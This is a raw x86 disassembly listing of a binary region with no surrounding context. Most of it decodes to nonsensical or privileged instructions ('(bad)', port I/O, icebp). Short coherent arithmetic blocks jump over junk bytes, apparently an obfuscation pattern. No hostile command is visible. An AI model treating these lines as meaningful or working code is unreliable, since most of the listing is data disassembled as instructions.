  413fb4:	cmc    
  413fb5:	xor    DWORD PTR [eax-0x6fbb8a15],eax
  413fbb:	push   0xffffffe4
  413fbd:	jae    0x414034
  413fbf:	and    dl,BYTE PTR [edx]
  413fc1:	pop    es
  413fc2:	push   esp
  413fc3:	xor    bl,dl
  413fc5:	in     eax,dx
  413fc6:	scas   eax,DWORD PTR es:[edi]
  413fc7:	cmp    al,0xc
  413fc9:	into   
  413fca:	icebp  
  413fcb:	scas   al,BYTE PTR es:[edi]
  413fcc:	hlt    
  413fcd:	fidivr DWORD PTR [eax+0x3e]
  413fd0:	pop    ss
  413fd1:	mov    ecx,DWORD PTR [ebp-0xc]
  413fd4:	imul   eax,ecx
  413fd7:	jmp    0x4140a2
  413fdc:	retf   0xe079
  413fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe0:	repz mov ebp,0x964f7fcf
  413fe6:	mov    dh,0x1c
  413fe8:	ins    BYTE PTR es:[edi],dx
  413fe9:	in     eax,0x93
  413feb:	ficomp WORD PTR [ebp-0x21]
  413fee:	add    BYTE PTR [eax],al
  413ff0:	scas   al,BYTE PTR es:[edi]
  413ff1:	add    BYTE PTR [eax],al
  413ff3:	add    BYTE PTR [esi+0x3c],al
  413ff6:	and    ebx,DWORD PTR [ebx-0x2e]
  413ff9:	loop   0x413ff5
  413ffb:	dec    esi
  413ffc:	dec    esi
  413ffd:	int    0xa1
  413fff:	lods   al,BYTE PTR gs:[esi]
  414001:	inc    eax
  414002:	daa    
  414003:	popf   
  414004:	pop    eax
  414005:	std    
  414006:	sbb    DWORD PTR [eax-0x46],edi
  414009:	inc    esi
  41400a:	ins    BYTE PTR es:[edi],dx
  41400b:	or     DWORD PTR [esi+0x75],edx
  41400e:	test   al,0x99
  414010:	and    cl,BYTE PTR ds:0xd113334c
  414016:	leave  
  414017:	test   al,0xde
  414019:	scas   al,BYTE PTR es:[edi]
  41401a:	std    
  41401b:	aas    
  41401c:	push   ecx
  41401d:	push   es
  41401e:	push   esi
  41401f:	pop    edi
  414020:	or     al,0xf3
  414022:	scas   al,BYTE PTR es:[edi]
  414023:	in     al,dx
  414024:	sbb    BYTE PTR [eax+ebx*4+0x2c4436db],bh
  41402b:	adc    edx,edi
  41402d:	mov    ecx,0xa25b4bb2
  414032:	jbe    0x41404b
  414034:	in     al,0x33
  414036:	push   es
  414037:	mov    esi,0x73670f87
  41403c:	(bad)  
  41403d:	push   es
  41403e:	dec    eax
  41403f:	cwde   
  414040:	out    dx,al
  414041:	xchg   ebx,eax
  414042:	mov    bh,0xc4
  414044:	aaa    
  414045:	push   eax
  414046:	daa    
  414047:	lahf   
  414048:	pop    es
  414049:	or     dl,0xbb
  41404c:	cdq    
  41404d:	dec    ebx
  41404e:	mov    ah,0xc4
  414050:	mov    ch,0x86
  414052:	mov    dl,0x85
  414054:	leave  
  414055:	out    dx,al
  414056:	sub    al,0x44
  414058:	inc    ebp
  414059:	call   0xa4d0cac1
  41405e:	data16 sbb BYTE PTR [ebx+0x474fdac2],dl
  414065:	add    cl,BYTE PTR [eax-0x5dff545d]
  41406b:	xor    BYTE PTR [ebx-0x77],ch
  41406e:	int3   
  41406f:	cmp    eax,0x640acd95
  414074:	neg    DWORD PTR ds:0xe711a98e
  41407a:	jae    0x4140b3
  41407c:	mov    BYTE PTR [esi],bh
  41407e:	int3   
  41407f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414080:	push   es
  414081:	mov    dl,0x15
  414083:	sahf   
  414084:	push   eax
  414085:	jbe    0x4140ba
  414087:	in     eax,dx
  414088:	sbb    al,0x99
  41408a:	nop
  41408b:	sbb    esp,DWORD PTR [ebp-0x2e]
  41408e:	mov    bl,0x1e
  414090:	mov    esi,0xd35aab46
  414095:	fisubr WORD PTR [edi-0x3a]
  414098:	(bad)  
  414099:	sub    DWORD PTR [ebx],edx
  41409b:	and    ecx,esp
  41409d:	stos   BYTE PTR es:[edi],al
  41409e:	xchg   edx,eax
  41409f:	mov    eax,0x4d8b354e
  4140a4:	cld    
  4140a5:	imul   eax,eax,0x7931
  4140ab:	xor    edx,edx
  4140ad:	jmp    0x414178
  4140b2:	pusha  
  4140b3:	xor    eax,0xdaf5dab5
  4140b8:	outs   dx,DWORD PTR ds:[esi]
  4140b9:	mov    edi,0x25fac69
  4140be:	pop    ds
  4140bf:	(bad)  
  4140c0:	or     al,0xcd
  4140c2:	or     esp,eax
  4140c4:	add    BYTE PTR [eax],al
  4140c6:	scas   al,BYTE PTR es:[edi]
  4140c7:	add    BYTE PTR [eax],al
  4140c9:	add    BYTE PTR [ebp+0x1d],ch
  4140cc:	in     al,dx
  4140cd:	cld    
  4140ce:	pop    eax
  4140cf:	or     eax,0x43a39150
  4140d4:	inc    edx
  4140d5:	mov    al,0x72
  4140d7:	xchg   ebx,eax
  4140d8:	cmp    al,0xf4
  4140da:	daa    
  4140db:	sub    cl,BYTE PTR [ebx+0x35a29219]
  4140e1:	mul    BYTE PTR [esp+edx*4]
  4140e4:	ss pushf 
  4140e6:	cmp    DWORD PTR [ebp+0x44],edi
  4140e9:	push   0x16
  4140eb:	loop   0x414103
  4140ed:	mov    ds:0x29d1e910,eax
  4140f2:	inc    esp
  4140f3:	ins    DWORD PTR es:[edi],dx
  4140f4:	add    ebx,DWORD PTR [edi-0x34]
  4140f7:	fsubr  QWORD PTR [edx]
  4140f9:	and    bh,bh
  4140fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140fc:	mov    al,0x10
  4140fe:	stos   DWORD PTR es:[edi],eax
  4140ff:	mov    ebx,0x324008f3
  414104:	je     0x4140f5
  414106:	shl    cl,0x2e
  414109:	cmp    dh,BYTE PTR [edx-0x10bb49d0]
  41410f:	int3   
  414110:	add    al,0x2c
  414112:	in     al,0x7e
  414114:	inc    edi
  414115:	push   ds
  414116:	add    al,0xb5
  414119:	(bad)  
  41411b:	retf   0x9acb
  41411e:	nop
  41411f:	sbb    ah,BYTE PTR [ecx-0x20b487b5]
  414125:	imul   ecx,DWORD PTR [esi-0xd],0x7e
  414129:	ins    BYTE PTR es:[edi],dx
  41412a:	adc    al,0x96
  41412c:	out    0x2,al
  41412e:	fstp   DWORD PTR [edx]
  414130:	fscale 
  414132:	mov    ecx,0xe3d6ade9
  414137:	into   
  414138:	outs   dx,DWORD PTR ds:[esi]
  414139:	inc    ebp
  41413a:	mov    ecx,0xbc93c32b
  41413f:	xor    al,cl
  414141:	je     0x414136
  414143:	shr    BYTE PTR [ebp-0x4d67c1cd],1
  414149:	jge    0x41412b
  41414b:	mov    esi,0x47d8be20
  414150:	lods   eax,DWORD PTR ds:[esi]
  414151:	sub    BYTE PTR [eax-0x7125ce06],dl
  414157:	adc    esp,eax
  414159:	loope  0x4141ae
  41415b:	aam    0x12
  41415d:	mov    ds:0xdbb6e10b,al
  414162:	pop    eax
  414163:	repz add DWORD PTR ds:0x19b17e1a,esi
  41416b:	xlat   BYTE PTR ds:[ebx]
  41416c:	out    dx,al
  41416d:	add    DWORD PTR [ebp+0x1b],eax
  414170:	xor    al,0xe5
  414172:	xor    edx,DWORD PTR [esi+eiz*1]
  414175:	ret    0x3a84
  414178:	div    ecx
  41417a:	sub    eax,0xbec
  41417f:	jmp    0x41424a
  414184:	and    BYTE PTR [ebp-0x60406046],ah
  41418a:	and    eax,0x26e067bf
  41418f:	jo     0x4141fe
  414191:	stos   BYTE PTR es:[edi],al
  414192:	(bad)  
  414193:	imul   edi,DWORD PTR [ecx-0x51ffff20],0x30000000
  41419d:	inc    ebx
  41419e:	jge    0x4141fa
  4141a0:	out    dx,al
  4141a1:	mov    WORD PTR [eax],?
  4141a3:	and    ecx,DWORD PTR [ebx+0x7c]
  4141a6:	es out 0x43,al
  4141a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141aa:	xchg   ebx,eax
  4141ab:	add    al,0x3
  4141ae:	test   al,0xd4
  4141b0:	and    eax,0x5f55b0b0
  4141b5:	shr    DWORD PTR [edi],cl
  4141b7:	sbb    BYTE PTR ds:0x7fb605ec,al
  4141bd:	mov    bl,0x31
  4141bf:	inc    edx
  4141c0:	mov    esp,DWORD PTR [edx+0xeac424]
  4141c6:	icebp  
  4141c7:	xchg   esp,eax
  4141c8:	push   ecx
  4141c9:	fidivr WORD PTR [ebp+0x2f628275]
  4141cf:	in     al,dx
  4141d0:	nop
  4141d1:	pop    esi
  4141d2:	pushf  
  4141d3:	test   BYTE PTR [esi],dh
  4141d5:	pop    esp
  4141d6:	test   DWORD PTR [esi],ebx
  4141d8:	pop    esp
  4141d9:	mov    al,ds:0x1a80db82
  4141de:	dec    esp
  4141df:	sub    ebx,ecx
  4141e1:	repz loop 0x4141d4
  4141e4:	retf   
  4141e5:	repz fdiv st,st(0)
  4141e8:	idiv   edx
  4141ea:	xchg   ebx,ebp
  4141ec:	daa    
  4141ed:	ror    BYTE PTR [edx+0x2fbfeaaa],cl
  4141f3:	mov    ebp,DWORD PTR [ebx+edx*4]
  4141f6:	clc    
  4141f7:	xchg   ebx,eax
  4141f8:	in     eax,0x3e
  4141fa:	fld    st(2)
  4141fc:	dec    ebx
  4141fd:	mov    WORD PTR [edi-0x22],gs
  414200:	jo     0x41418c
  414202:	mov    ebx,0xc0aa7ae7
  414207:	enter  0xe3ba,0xa3
  41420b:	jmp    0x4141ff
  41420d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41420e:	adc    DWORD PTR [edi-0x344d1b24],ebp
  414214:	push   edx
  414215:	lds    esp,FWORD PTR [edi-0x35]
  414218:	mov    ecx,0x9a52436d
  41421d:	sub    al,0x6d
  41421f:	pop    ebp
  414220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414221:	es mov al,0xf5
  414224:	std    
  414225:	pop    esp
  414226:	push   esp
  414227:	loop   0x4141e2
  414229:	out    dx,eax
  41422a:	inc    esp
  41422b:	xchg   esp,eax
  41422c:	sbb    ch,dl
  41422e:	adc    bh,BYTE PTR [edx]
  414230:	mov    eax,ds:0xc9287e5d
  414235:	lods   al,BYTE PTR ds:[esi]
  414236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414238:	cwde   
  414239:	mov    ds:0xf9c638bd,al
  41423e:	outs   dx,BYTE PTR ds:[esi]
  41423f:	push   ds
  414240:	cmc    
  414241:	push   ds
  414242:	test   al,0x68
  414244:	js     0x4141e5
  414246:	xchg   DWORD PTR [ebp-0x6f],ebx
  414249:	and    DWORD PTR [ecx+0x45c7dc45],ecx
  41424f:	sar    BYTE PTR [edx],1
  414251:	fucomi st,st(0)
  414253:	push   0xffffffc7
  414255:	inc    ebp
  414256:	aam    0x2
  414258:	add    BYTE PTR [eax],al
  41425a:	add    bh,al
  41425c:	inc    ebp
  41425d:	fmul   st,st(6)
  41425f:	xor    DWORD PTR [eax],eax
  414261:	add    bh,al
  414263:	inc    ebp
  414264:	fsubr  QWORD PTR [ebx]
  414266:	add    BYTE PTR ds:[eax],al
  414269:	mov    DWORD PTR [ebp-0x20],0x4085
  414270:	mov    DWORD PTR [ebp-0x1c],0x490a
  414277:	mov    eax,DWORD PTR [ebp-0x20]
  41427a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41427d:	mov    edx,DWORD PTR [ebp-0x28]
  414280:	mov    esi,DWORD PTR [ebp-0x24]
  414283:	add    eax,0x445e
  414288:	adc    ecx,0x4392
  41428e:	or     eax,edx
  414290:	jmp    0x41435b
  414295:	mov    ebp,0x5fba57b1
  41429a:	(bad)  
  41429b:	std    
  41429c:	mov    bh,0xf4
  41429e:	ss jg  0x4142ae
  4142a1:	jb     0x41430b
  4142a3:	pop    esp
  4142a4:	dec    esi
  4142a5:	addr16 loope 0x4142a8
  4142a8:	add    BYTE PTR [esi-0x42000000],ch
  4142ae:	push   es
  4142af:	idiv   ecx
  4142b1:	cdq    
  4142b2:	js     0x414276
  4142b4:	mov    dh,cl
  4142b6:	mov    eax,ds:0x48c3d8a4
  4142bb:	xor    eax,0x6892900d
  4142c0:	das    
  4142c1:	cli    
  4142c2:	rcl    DWORD PTR [eax],0xe3
  4142c5:	mov    edi,DWORD PTR [ebx-0x7c]
  4142c8:	out    0x29,al
  4142ca:	pop    esi
  4142cb:	add    al,0xa2
  4142cd:	cmp    eax,0x6e13ef67
  4142d2:	das    
  4142d3:	cwde   
  4142d4:	enter  0x7b6d,0xef
  4142d8:	jg     0x4142fd
  4142da:	sahf   
  4142db:	in     al,0xbc
  4142dd:	mov    DWORD PTR [ebx+0x77b934b],edx
  4142e3:	rol    DWORD PTR [edx-0x6fc53d40],1
  4142e9:	mov    ?,esp
  4142eb:	cwde   
  4142ec:	aaa    
  4142ed:	mov    WORD PTR [eax],cs
  4142ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142f0:	hlt    
  4142f1:	arpl   WORD PTR [ecx],di
  4142f3:	int3   
  4142f4:	xor    BYTE PTR [esi-0x76],ch
  4142f7:	jbe    0x41431f
  4142f9:	push   edi
  4142fa:	dec    esp
  4142fb:	sbb    al,0x41
  4142fd:	and    BYTE PTR [ecx],dl
  4142ff:	jge    0x4142bf
  414301:	sbb    eax,0xc660cbe
  414306:	(bad)  
  414307:	fisub  DWORD PTR [ecx+0x52]
  41430a:	retf   
  41430b:	(bad)  
  41430c:	nop
  41430d:	add    ah,al
  41430f:	sahf   
  414310:	pop    eax
  414311:	icebp  
  414312:	xor    esp,DWORD PTR [ebp+0x7f3ddcae]
  414318:	xchg   ebp,eax
  414319:	ror    BYTE PTR [edi-0x7f],0x14
  41431d:	dec    ebx
  41431e:	fcomip st,st(5)
  414320:	push   edx
  414321:	bound  ecx,QWORD PTR [ebp+0x45]
  414324:	adc    ebp,DWORD PTR [ebp+0x48]
  414327:	mov    BYTE PTR [edi],bh
  414329:	xor    eax,0x771db6d2
  41432e:	jmp    0xe2add880
  414333:	jb     0x41433a
  414335:	in     al,dx
  414336:	add    BYTE PTR [ecx-0x5cee49c7],ah
  41433c:	fstp   st(1)
  41433e:	mov    dl,0xc
  414340:	les    eax,FWORD PTR [ecx-0x24]
  414343:	adc    BYTE PTR [ecx-0x68],0xac
  414347:	jmp    0x54ff:0x5d49f701
  41434e:	(bad)  
  41434f:	leave  
  414350:	fld    QWORD PTR [eax-0x66]
  414353:	dec    ebx
  414354:	dec    esi
  414355:	repnz or BYTE PTR [edx-0x34],dh
  414359:	cmp    cx,WORD PTR [ebx-0x31f42fab]
  414360:	mov    esi,DWORD PTR [ebp-0x2c]
  414363:	push   esi
  414364:	push   edx
  414365:	push   ecx
  414366:	push   eax
  414367:	jmp    0x414432
  41436c:	out    0xc3,eax
  41436e:	pop    ebx
  41436f:	out    dx,eax
  414370:	jg     0x414371
  414372:	test   ebx,0x7016eeba
  414378:	int3   
  414379:	popf   
  41437a:	push   edx
  41437b:	imul   edx,DWORD PTR ds:0xae0000e2,0xbb000000
  414385:	or     DWORD PTR [ecx+0x50],edx
  414388:	jmp    0x2045e341
  41438d:	in     eax,0x66
  41438f:	dec    ecx
  414390:	push   0x49
  414392:	in     eax,dx
  414393:	adc    DWORD PTR [ecx+0x67eca9f],0x91f327b9
  41439d:	sahf   
  41439e:	retf   
  41439f:	aad    0x87
  4143a1:	fdivr  QWORD PTR [eax-0x1d0a0472]
  4143a7:	enter  0xb412,0x21
  4143ab:	pop    ebx
  4143ac:	fnstsw WORD PTR [esi+0x8e2366e]
  4143b2:	mov    es,WORD PTR [esi+0x70]
  4143b5:	out    0x25,al
  4143b7:	popf   
  4143b8:	(bad)  
  4143b9:	lods   eax,DWORD PTR gs:[esi]
  4143bb:	in     eax,dx
  4143bc:	mov    dh,0x55
  4143be:	imul   esp,edi,0x25fcef0e
  4143c4:	retf   
  4143c5:	retf   0x2043
  4143c8:	push   eax
  4143c9:	add    eax,0x600cee50
  4143ce:	pushf  
  4143cf:	outs   dx,BYTE PTR ds:[esi]
  4143d0:	out    dx,eax
  4143d1:	sub    eax,0xf354012
  4143d6:	dec    ebx
  4143d7:	cli    
  4143d8:	and    eax,0x8161cfa7
  4143dd:	data16 test al,0x48
  4143e0:	enter  0xc12e,0xb3
  4143e4:	repnz adc DWORD PTR [ebp+0x5dbfce21],esp
  4143eb:	pop    DWORD PTR [esp+esi*8-0x3]
  4143ef:	inc    eax
  4143f0:	add    BYTE PTR [edi+eiz*4],0xc3
  4143f4:	pop    ecx
  4143f5:	out    dx,al
  4143f6:	adc    al,0x54
  4143f8:	jb     0x414390
  4143fa:	in     al,0xb0
  4143fc:	jno    0x4143e2
  4143fe:	jp     0x41439e
  414400:	not    BYTE PTR [ebx-0x7d]
  414403:	pop    edx
  414404:	push   es
  414405:	and    al,0x6b
  414407:	fwait
  414408:	sub    DWORD PTR [eax+eiz*1],edi
  41440b:	mov    edi,0xde5752f9
  414410:	cmp    dh,dh
  414412:	mov    al,0xda
  414414:	sbb    al,0x5c
  414416:	sbb    ch,bl
  414418:	stos   BYTE PTR es:[edi],al
  414419:	addr16 popf 
  41441b:	stos   BYTE PTR es:[edi],al
  41441c:	aas    
  41441d:	jmp    0x4143a2
  41441f:	inc    edx
  414420:	xor    BYTE PTR [edi-0x2e8c6ae1],dl
  414426:	dec    ebx
  414427:	mov    ah,BYTE PTR [edx]
  414429:	outs   dx,BYTE PTR ds:[esi]
  41442a:	icebp  
  41442b:	inc    ecx
  41442c:	(bad)  
  41442d:	and    eax,0x9a18c243
  414432:	call   0x423dad
  414437:	and    eax,0x5759
  41443c:	and    edx,0x4b06
  414442:	jmp    0x41450d
  414447:	mov    DWORD PTR [ebp-0x15],esi
  41444a:	push   ecx
  41444b:	(bad)  
  41444c:	fistp  QWORD PTR [ebx-0x61dfec03]
  414452:	or     eax,0x957a1735
  414457:	ret    
  414458:	loop   0x41445a
  41445a:	add    BYTE PTR [esi-0x12000000],ch
  414460:	pop    es
  414461:	cmc    
  414462:	test   eax,0x4ac5f112
  414467:	imul   edx,DWORD PTR ds:0x7e87dec3,0x48
  41446e:	aad    0x42
  414470:	sbb    DWORD PTR [edx],ecx
  414472:	iret   
  414473:	clc    
  414474:	sub    DWORD PTR [ebx+0x4d08cd5f],ecx
  41447a:	out    0x45,al
  41447c:	mov    al,ds:0x76b77b7b
  414481:	pop    DWORD PTR [esi+0x9411555]
  414487:	(bad)  
  414488:	pop    ss
  414489:	push   ds
  41448a:	aad    0xd
  41448c:	mov    esi,DWORD PTR [ebx+0x5d]
  41448f:	outs   dx,BYTE PTR ds:[esi]
  414490:	sbb    edx,DWORD PTR [ecx+0x5a5d69b7]
  414496:	mov    eax,0x36f083f6
  41449b:	fdivr  QWORD PTR [ebx+0x37]
  41449e:	inc    esp
  41449f:	sar    BYTE PTR [esi-0x357391c4],1
  4144a5:	or     al,BYTE PTR [ebx+eiz*4-0x18]
  4144a9:	dec    ebp
  4144aa:	adc    DWORD PTR [ebp+eax*4+0x6],esi
  4144ae:	adc    BYTE PTR [eax+0x32],bl
  4144b1:	sahf   
  4144b2:	sub    bh,dh
  4144b4:	pushf  
  4144b5:	aaa    
  4144b6:	std    
  4144b7:	imul   ecx,esp,0xffffffd1
  4144ba:	ret    
  4144bb:	jecxz  0x414450
  4144bd:	hlt    
  4144be:	mov    BYTE PTR [eax+eiz*8],al
  4144c1:	adc    eax,0xbcda5e2
  4144c6:	dec    ebx
  4144c7:	push   edx
  4144c8:	int3   
  4144c9:	in     al,dx
  4144ca:	or     bl,BYTE PTR [edx]
  4144cc:	adc    dh,BYTE PTR [bx+si-0x493b]
  4144d1:	sub    DWORD PTR [ebx],ebx
  4144d3:	cmp    BYTE PTR [eax+0x3676a70b],bl
  4144d9:	mov    esp,0x5f2cc27e
  4144de:	inc    edi
  4144df:	ja     0x4144cf
  4144e1:	sub    esp,DWORD PTR [ebp-0x58]
  4144e4:	dec    esp
  4144e5:	and    eax,0xa206a595
  4144ea:	mov    edi,0xd1ee39c2
  4144ef:	mov    edx,0xe108d304
  4144f4:	ins    BYTE PTR es:[edi],dx
  4144f5:	jns    0x414515
  4144f7:	lfs    esp,FWORD PTR [ecx-0x5d]
  4144fb:	(bad)  
  4144fc:	xor    eax,0xf567409d
  414501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414502:	(bad)  
  414504:	lods   eax,DWORD PTR ds:[esi]
  414505:	shl    BYTE PTR [edx+0x1f40bed8],cl
  41450b:	dec    eax
  41450c:	or     al,BYTE PTR ds:0xffffb9c5
  414512:	mov    DWORD PTR [ebp-0x20],eax
  414515:	adc    edx,0xffffffff
  414518:	mov    DWORD PTR [ebp-0x1c],edx
  41451b:	jmp    0x4145e6
  414520:	nop
  414521:	rol    al,0x18
  414524:	rcr    BYTE PTR [eax],1
  414526:	fmul   st,st(0)
  414528:	push   ebx
  414529:	ds (bad) 
  41452b:	int    0x59
  41452d:	icebp  
  41452e:	inc    ebx
  41452f:	imul   esi,DWORD PTR [ecx-0x1d],0xae0000
  414536:	add    BYTE PTR [eax],al
  414538:	shl    DWORD PTR [ecx+esi*2],0x5c
  41453c:	adc    eax,0x6c74ab12
  414541:	mov    dl,0xe3
  414543:	xchg   edi,eax
  414544:	add    DWORD PTR [edx+ebx*1],edi
  414547:	jae    0x414592
  414549:	sti    
  41454a:	aas    
  41454b:	inc    esi
  41454c:	pusha  
  41454d:	pop    esi
  41454e:	(bad)  
  41454f:	lock inc ebp
  414551:	mov    ecx,ebp
  414553:	dec    ecx
  414554:	test   BYTE PTR [edx],ch
  414556:	pusha  
  414557:	in     eax,dx
  414558:	pop    edx
  414559:	add    eax,DWORD PTR [eax+0x4717de81]
  41455f:	dec    esi
  414560:	outs   dx,DWORD PTR ds:[esi]
  414561:	mov    dh,0x75
  414563:	mov    bl,ch
  414565:	std    
  414566:	sti    
  414567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414568:	loopne 0x4145ca
  41456a:	push   ecx
  41456b:	fdivrp st(0),st
  41456d:	cmp    ebp,ecx
  41456f:	aas    
  414570:	fiadd  DWORD PTR [ebp-0x6b]
  414573:	dec    ebx
  414574:	bound  eax,QWORD PTR [esi+0x3e9c09c0]
  41457a:	cs mov cl,0xae
  41457d:	jnp    0x414598
  41457f:	(bad)  
  414580:	aas    
  414581:	cmp    dh,BYTE PTR [edi+0x67]
  414584:	sub    ah,BYTE PTR [edx-0x7425d87c]
  41458a:	sbb    eax,ebp
  41458c:	sub    DWORD PTR [ebx],0xa83de7b4
  414592:	jecxz  0x414596
  414594:	cmp    al,0x43
  414596:	sub    esp,edx
  414598:	mov    ecx,0xd791a1bc
  41459d:	inc    edi
  41459e:	cli    
  41459f:	add    DWORD PTR [ecx-0x48],0x50
  4145a3:	jns    0x4145ec
  4145a5:	das    
  4145a6:	cmp    al,0x5
  4145a8:	fcomip st,st(3)
  4145aa:	hlt    
  4145ab:	push   edx
  4145ac:	rcr    DWORD PTR [ebx+0x66],cl
  4145af:	cmp    BYTE PTR [eax-0x1f37f62b],dh
  4145b5:	cmp    BYTE PTR [eax],dl
  4145b7:	dec    edx
  4145b8:	push   edi
  4145b9:	pop    ecx
  4145ba:	retf   
  4145bb:	add    al,0x6b
  4145bd:	bound  ebx,QWORD PTR [eax+0x6e910ced]
  4145c3:	sub    BYTE PTR [eax-0x5ab9dfc3],0x66
  4145ca:	push   0xc180b21f
  4145cf:	sbb    BYTE PTR [esi+0xd],bl
  4145d2:	pusha  
  4145d3:	fidivr DWORD PTR [ecx+0x5]
  4145d6:	rcl    BYTE PTR [edi-0x7d],0xe7
  4145da:	retf   0xd1f3
  4145dd:	repnz int 0xab
  4145e0:	or     DWORD PTR [edx+ebp*1-0x51],esi
  4145e4:	and    DWORD PTR [eax],0x168045c7
  4145ea:	jnp    0x4145ec
  4145ec:	add    bh,al
  4145ee:	inc    ebp
  4145ef:	mov    esp,0x21cb
  4145f4:	mov    DWORD PTR [ebp-0x78],0x1602
  4145fb:	jmp    0x4146c6
  414600:	aas    
  414601:	jns    0x4145d6
  414603:	push   edx
  414604:	xlat   BYTE PTR ds:[ebx]
  414605:	cli    
  414606:	mov    edi,0x42dbb67d
  41460b:	gs add al,0xdb
  41460e:	(bad)
  414612:	add    BYTE PTR [eax],al
  414614:	scas   al,BYTE PTR es:[edi]
  414615:	add    BYTE PTR [eax],al
  414617:	add    BYTE PTR [eax-0x12acd2d1],ah
  41461d:	cmc    
  41461e:	lods   eax,DWORD PTR ds:[esi]
  41461f:	mov    dh,0xcc
  414621:	add    eax,DWORD PTR [edx-0xf78f872]
  414627:	addr16 lahf 
  414629:	enter  0xcb11,0xcb
  41462d:	xor    BYTE PTR [edi],cl
  41462f:	gs out dx,al
  414631:	lahf   
  414632:	aas    
  414633:	mov    dh,0xe3
  414635:	mov    ds,WORD PTR [edx]
  414637:	mov    eax,0x494259b1
  41463d:	retf   
  41463e:	xor    DWORD PTR ds:0x4b3abbfe,esp
  414644:	movaps xmm7,xmm7
  414647:	jae    0x414612
  414649:	add    edx,DWORD PTR [eax+ebp*8]
  41464c:	mov    cs,eax
  41464e:	xchg   edi,eax
  41464f:	out    0x5f,al
  414651:	stos   BYTE PTR es:[edi],al
  414652:	cld    
  414653:	imul   ebx,DWORD PTR [ecx],0xffffffb4
  414656:	cld    
  414657:	sbb    eax,0x4fd905cd
  41465c:	jmp    0x4146ab
  41465e:	push   cs
  41465f:	or     eax,0x1ad0fddb
  414664:	sub    DWORD PTR [edi+0x783dc78d],esp
  41466a:	pushf  
  41466b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466c:	cs inc esp
  41466e:	ins    DWORD PTR es:[edi],dx
  41466f:	scas   al,BYTE PTR es:[edi]
  414670:	add    al,bh
  414672:	jns    0x414631
  414674:	(bad)  
  414675:	ror    DWORD PTR [edi+0x4],1
  414678:	cli    
  414679:	xor    al,0xb5
  41467b:	outs   dx,DWORD PTR ds:[esi]
  41467c:	mov    ebp,0x2634b2e7
  414681:	(bad)  
  414682:	dec    edi
  414683:	and    esi,ecx
  414685:	inc    edi
  414686:	aad    0x3d
  414688:	inc    edi
  414689:	retf   
  41468a:	loope  0x4146e8
  41468c:	push   ebx
  41468d:	pushf  
  41468e:	push   es
  41468f:	and    al,0x9e
  414691:	enter  0x5b2f,0xf9
  414695:	lds    edx,FWORD PTR [edi+0xda39038]
  41469b:	fcom   DWORD PTR [eax*1-0x6c4f4c4e]
  4146a2:	mov    bl,0x29
  4146a4:	dec    ebx
  4146a5:	pusha  
  4146a6:	in     eax,dx
  4146a7:	aas    
  4146a8:	mov    eax,DWORD PTR [ebx-0x33]
  4146ab:	push   ds
  4146ac:	mov    eax,0xbef15063
  4146b1:	fstp   st(6)
  4146b3:	or     BYTE PTR [esi],al
  4146b5:	dec    esi
  4146b7:	mov    edx,DWORD PTR [edx-0x67]
  4146ba:	mov    esi,0xa1ebf7da
  4146bf:	inc    ecx
  4146c0:	clc    
  4146c1:	aam    0xa6
  4146c3:	test   DWORD PTR [ecx-0x50],esp
  4146c6:	mov    DWORD PTR [ebp-0x74],0x5b5a
  4146cd:	mov    DWORD PTR [ebp-0x3c],0x394c
  4146d4:	mov    DWORD PTR [ebp-0x84],0x4db2
  4146de:	mov    DWORD PTR [ebp-0x58],0x3585
  4146e5:	mov    DWORD PTR [ebp-0x50],0x77d9
  4146ec:	mov    DWORD PTR [ebp-0x4],0x1
  4146f3:	jmp    0x4147be
  4146f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f9:	imul   ebx,DWORD PTR [eax-0x410c20de],0x61d813ed
  414703:	int    0xe2
  414705:	push   0xe4cd337f
  41470a:	add    BYTE PTR [eax],al
  41470c:	scas   al,BYTE PTR es:[edi]
  41470d:	add    BYTE PTR [eax],al
  41470f:	add    BYTE PTR [ebp+0x23],cl
  414712:	retf   0xa366
  414715:	push   ecx
  414716:	cmp    DWORD PTR [edx+0x28d1095f],esi
  41471c:	mov    WORD PTR [eax-0x78611171],es
  414722:	and    DWORD PTR [edx-0x313986a5],eax
  414728:	add    eax,0x1ae35e8d
  41472d:	xchg   esi,eax
  41472e:	lock mov bh,0x31
  414731:	sbb    cl,ah
  414733:	pop    ecx
  414734:	mov    WORD PTR [eax],?
  414736:	and    eax,0x209815ac
  41473b:	les    esp,FWORD PTR [ecx+0x66]
  41473e:	cmc    
  41473f:	pop    ebp
  414740:	xchg   esp,eax
  414741:	cdq    
  414742:	sub    DWORD PTR [edi+edx*1-0x50],esi
  414746:	jmp    0x4146d4
  414748:	cli    
  414749:	ins    DWORD PTR es:[edi],dx
  41474a:	jle    0x4146ef
  41474c:	push   es
  41474d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41474e:	xchg   ebx,eax
  41474f:	or     BYTE PTR [eax-0x64352f7b],al
  414755:	inc    eax
  414756:	xchg   esp,eax
  414757:	mov    bl,0xb0
  414759:	jl     0x414769
  41475b:	repz dec ecx
  41475d:	dec    esi
  41475e:	push   0xdd9a2235
  414763:	dec    esp
  414764:	call   0xcbe19f4a
  414769:	jb     0x414766
  41476b:	aas    
  41476c:	mov    DWORD PTR [edi],eax
  41476e:	jb     0x414784
  414770:	xor    al,0xf4
  414772:	jnp    0x4147b6
  414774:	mov    al,0x52
  414776:	xchg   esp,eax
  414777:	pusha  
  414778:	sbb    eax,0x42f1d1e8
  41477d:	mov    ch,BYTE PTR [ecx+eiz*4]
  414780:	cli    
  414781:	or     edi,esp
  414783:	xchg   esi,eax
  414784:	adc    BYTE PTR [eax+esi*8-0x1f3ec8a9],0x28
  41478c:	popf   
  41478d:	call   0xa0febb8b
  414792:	push   ecx
  414793:	(bad)  
  414794:	xchg   ebx,eax
